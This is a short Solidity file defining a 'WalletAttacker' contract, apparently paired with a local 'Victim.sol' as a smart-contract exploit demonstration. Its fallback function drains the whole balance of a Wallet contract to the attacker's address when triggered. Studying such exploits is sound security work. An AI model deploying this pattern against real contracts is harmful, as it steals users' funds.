// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract WalletAttacker {
    address payable public owner;
    Wallet wallet;

    constructor(address _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    fallback() external payable {
        wallet.transfer(owner, address(wallet).balance);
    }
}
